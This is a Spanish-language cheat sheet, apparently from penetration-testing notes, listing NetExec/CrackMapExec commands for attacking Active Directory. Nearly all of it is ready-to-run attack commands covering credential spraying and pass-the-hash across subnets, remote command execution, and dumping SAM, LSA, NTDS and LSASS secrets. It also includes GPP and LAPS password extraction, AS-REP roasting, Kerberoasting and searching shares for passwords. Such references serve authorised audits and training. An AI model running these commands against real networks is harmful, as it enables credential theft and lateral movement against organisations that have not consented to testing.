# NetExec (nxc) / CrackMapExec (cme)



Swiss-army knife para auditorías de AD. Verifica credenciales, ejecuta comandos y extrae información a escala de red.

#### Instalación

```bash
pip3 install netexec
# o
apt install crackmapexec
```

#### Comandos principales

```bash
# --- Verificación de credenciales ---
nxc smb 10.10.10.0/24 -u usuario -p contraseña
nxc smb 10.10.10.0/24 -u usuario -H NTHASH
nxc smb 10.10.10.0/24 -u users.txt -p passwords.txt --no-bruteforce
nxc winrm 10.10.10.0/24 -u usuario -p contraseña
nxc rdp 10.10.10.0/24 -u usuario -p contraseña
nxc ldap 10.10.10.10 -u usuario -p contraseña

# --- Enumeración ---
nxc smb 10.10.10.10 -u usuario -p contraseña --users
nxc smb 10.10.10.10 -u usuario -p contraseña --groups
nxc smb 10.10.10.10 -u usuario -p contraseña --computers
nxc smb 10.10.10.10 -u usuario -p contraseña --shares
nxc smb 10.10.10.10 -u usuario -p contraseña --pass-pol
nxc smb 10.10.10.10 -u usuario -p contraseña --loggedon-users
nxc smb 10.10.10.10 -u usuario -p contraseña --sessions

# --- Ejecución de comandos ---
nxc smb 10.10.10.10 -u usuario -p contraseña -x "whoami"
nxc smb 10.10.10.10 -u usuario -p contraseña -X "Get-Process"  # PowerShell
nxc winrm 10.10.10.10 -u usuario -p contraseña -x "whoami"

# --- Dump de credenciales ---
nxc smb 10.10.10.10 -u usuario -p contraseña --sam
nxc smb 10.10.10.10 -u usuario -p contraseña --lsa
nxc smb 10.10.10.10 -u usuario -p contraseña --ntds           # DCSync / NTDS dump
nxc smb 10.10.10.10 -u usuario -p contraseña -M lsassy        # LSASS dump
nxc smb 10.10.10.10 -u usuario -p contraseña -M nanodump      # Alternativa a lsassy

# --- Módulos de ataque ---
nxc smb 10.10.10.10 -u usuario -p contraseña -M gpp_password   # GPP passwords
nxc ldap 10.10.10.10 -u usuario -p contraseña -M laps           # LAPS passwords
nxc ldap 10.10.10.10 -u usuario -p contraseña --asreproast out.txt
nxc ldap 10.10.10.10 -u usuario -p contraseña --kerberoasting out.txt
nxc smb 10.10.10.10 -u usuario -p contraseña --gen-relay-list relay_targets.txt

# --- Spider de shares ---
nxc smb 10.10.10.10 -u usuario -p contraseña -M spider_plus
nxc smb 10.10.10.10 -u usuario -p contraseña --spider SHARE --pattern "password|cred|secret"
```
